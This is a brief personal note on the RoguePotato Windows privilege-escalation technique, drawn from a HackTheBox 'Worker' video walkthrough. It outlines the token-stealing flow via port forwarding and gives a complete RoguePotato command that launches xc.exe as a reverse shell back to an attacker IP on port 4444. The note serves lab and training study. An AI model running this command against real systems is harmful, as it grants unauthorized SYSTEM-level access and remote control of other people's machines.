# RoguePotato

Note by manesec.

From Ippsec Video: [HackTheBox - Worker - YouTube](https://www.youtube.com/watch?v=Auqt-NSB4SQ)

```bash
Juicy - (spoof) -> 127.0.0.1:9999 (steal token)
Rogue -> ATTACKERS:135 -> TARGET:9999 -> steal token
```

Just need to forward remote 135 port to local 9999 port.

`XC` Tools have some bug, the first connection will be work.

## Command

```bash
RoguePotato.exe -r 10.10.14.20 -e "C:\mane\xc.exe 10.10.14.20 4444" -l 9999
```

-r `remote attack ip`

-l `remote attack port`  -> `Victims 135 port`


